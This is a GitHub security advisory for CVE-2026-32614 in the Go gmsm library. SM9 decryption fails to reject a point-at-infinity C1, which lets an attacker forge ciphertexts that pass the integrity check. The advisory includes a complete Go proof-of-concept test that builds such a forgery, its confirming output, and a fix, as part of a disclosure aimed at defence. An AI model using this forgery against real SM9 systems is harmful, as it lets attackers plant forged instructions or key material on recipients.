# [C] SM9 Infinity-Point Ciphertext Forgery Vulnerability

## Summary
Severity: Critical
Advisory: GHSA-5xxp-2vrj-x855
CVE: CVE-2026-32614
CWE: CWE-20, CWE-347
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-5xxp-2vrj-x855
Type: github-advisory

## Affected
- Go: `github.com/emmansun/gmsm` — affected >=0 <0.41.1

## Details
## Overview

The current SM9 decryption implementation contains an infinity-point ciphertext forgery vulnerability. The root cause is that, during decryption, the elliptic-curve point C1 in the ciphertext is only deserialized and checked to be on the curve, but the implementation does not explicitly reject the point at infinity.

In the current implementation, an attacker can construct C1 as the point at infinity, causing the bilinear pairing result to degenerate into the identity element in the GT group. As a result, a critical part of the key derivation input becomes a predictable constant. An attacker who only knows the target user's UID can derive the decryption key material and then forge a ciphertext that passes the integrity check.

## Impact

The direct impact of this vulnerability is ciphertext forgery, not confidentiality loss.

- The attacker does not need the master public key, the user's private key, or any other secret material.
- The attacker only needs to know the target UID to construct a seemingly valid ciphertext.
- When the recipient invokes the SM9 decryption API, the forged ciphertext decrypts successfully to attacker-chosen plaintext.
- The C3 integrity check also passes, so this is not merely a format bypass, but a full forgery.

This issue affects the following paths because they all eventually enter the same `UnwrapKey` logic:

- `sm9.Decrypt`
- `sm9.DecryptASN1`
- `sm9.UnwrapKey`

This means the issue affects not only public-key encryption/decryption, but also key encapsulation/decapsulation.

## Severity

This vulnerability should be rated as High.

Using CVSS 3.1 as a reference, it can be characterized as follows:

- Attack vector: Network
- Attack complexity: Low
- Privileges required: None
- User interaction: None
- Confidentiality impact: Low or None
- Integrity impact: High
- Availability impact: None

Overall, the estimated score falls in the High range, approximately 7.5.

It is High rather than Critical for the following reasons:

- It does not directly expose private keys and cannot directly decrypt legitimately generated ciphertexts.
- However, it can reliably break the authenticity and integrity assumptions of decrypted data.
- In any system that assumes only a legitimate sender can produce ciphertext that decrypts successfully, this is already a serious security failure.

## Typical Risk Scenarios

- An attacker forges a business message that can be successfully decrypted by the target user.
- The application mistakenly treats successful decryption as evidence that the message came from a legitimate encrypting party.
- The attacker tricks the recipient into accepting forged instructions, forged notifications, or forged key material.

If a system treats SM9 ciphertext as both confidential and trustworthy in origin, this vulnerability directly breaks that trust assumption.

## Root Cause

The root cause is that the implementation does not fully enforce the standard's decryption requirements: C1 must belong to the correct group, and C1 must not be the point at infinity.

It is important to be precise here: the point at infinity is itself a valid element of the elliptic-curve group and is mathematically on-curve. That is not the problem. The problem is not that the implementation incorrectly accepts the point at infinity as an on-curve point. Rather, the SM9 decryption procedure must do more than check that C1 is well-formed and on the curve; it must also explicitly reject C1 when it equals the group identity element O.

The current code only checks:

- Whether C1 can be successfully deserialized
- Whether C1 is on the curve

But it is missing:

- `C1 != O` (the point at infinity)

In other words, the issue is not that the on-curve check is wrong, but that the implementation omits the additional rejection of the group identity element. That omission is what makes the attack possible.

## Vulnerability recurrence

The overall process is as follows:
1. XOR the target plaintext with `key[:len(plaintext)]` to obtain `C2`.
2. Calculate `C3 = SM3(C2 || key[len(plaintext):])`, which involves concatenating `C2` with the latter part of the key and then computing the SM3 hash.
3. Construct the ciphertext as `ciphertext = C1 || C3 || C2`, which means concatenating `C1`, `C3`, and `C2` to form the final ciphertext.
4. Call `sm9.Decrypt(userKey, uid, ciphertext, sm9.DefaultEncrypterOpts)` for decryption.
7. Note that the PoC code did not use `userKey` when constructing the ciphertext. Therefore, if the decryption is successful and the target plaintext is obtained, it proves that the attack was successful.

```go
package sm9_test

import (
	"bytes"
	"crypto/rand"
	"testing"

	"github.com/emmansun/gmsm/internal/sm9/bn256"
	"github.com/emmansun/gmsm/sm3"
	"github.com/emmansun/gmsm/sm9"
)

func TestInfinityPointCiphertextForgeryPublicAPI(t *testing.T) {
	masterKey, err := sm9.GenerateEncryptMasterKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	hid := byte(0x01)
	uid := []byte("victim@example.com")

	userKey, err := masterKey.GenerateUserKey(uid, hid)
	if err != nil {
		t.Fatal(err)
	}

	plaintext := []byte("forged-without-public-encryption")

	c1 := make([]byte, 64)
	gtIdentity := new(bn256.GT).SetOne()

	var kdfInput []byte
	kdfInput = append(kdfInput, c1...)
	kdfInput = append(kdfInput, gtIdentity.Marshal()...)
	kdfInput = append(kdfInput, uid...)

	key1Len := len(plaintext)
	forgeKey := sm3.Kdf(kdfInput, key1Len+sm3.Size)

	c2 := make([]byte, key1Len)
	for i := range c2 {
		c2[i] = plaintext[i] ^ forgeKey[i]
	}

	hash := sm3.New()
	hash.Write(c2)
	hash.Write(forgeKey[key1Len:])
	c3 := hash.Sum(nil)

	forgedCiphertext := make([]byte, 0, 64+32+key1Len)
	forgedCiphertext = append(forgedCiphertext, c1...)
	forgedCiphertext = append(forgedCiphertext, c3...)
	forgedCiphertext = append(forgedCiphertext, c2...)

	recovered, err := sm9.Decrypt(userKey, uid, forgedCiphertext, sm9.DefaultEncrypterOpts)
	if err != nil {
		t.Fatalf("public Decrypt rejected forged ciphertext: %v", err)
	}

	if !bytes.Equal(recovered, plaintext) {
		t.Fatalf("plaintext mismatch: got %q, want %q", string(recovered), string(plaintext))
	}

	t.Logf("VULN_CONFIRMED: sm9.Decrypt accepted forged ciphertext, recovered=%q", string(recovered))
}
```

*Output*: VULN_CONFIRMED: sm9.Decrypt accepted forged ciphertext, recovered="forged-without-public-encryption"


## Remediation

In the shared `UnwrapKey` path used by both SM9 decryption and decapsulation, add an explicit rejection of the point at infinity after `Unmarshal` and `IsOnCurve` succeed.

Conceptually:

```go
if p.IsInfinity() {
    return nil, ErrDecryption
}
```

After the fix, unit tests should be added to ensure that:

- An all-zero C1 is rejected
- The raw ciphertext path rejects the forged input
- The ASN.1 ciphertext path rejects the forged input
- `UnwrapKey` also rejects the forged input

## References
- https://github.com/emmansun/gmsm/security/advisories/GHSA-5xxp-2vrj-x855
- https://nvd.nist.gov/vuln/detail/CVE-2026-32614
- https://github.com/emmansun/gmsm
- https://github.com/emmansun/gmsm/releases/tag/v0.41.1
- https://pkg.go.dev/vuln/GO-2026-4694
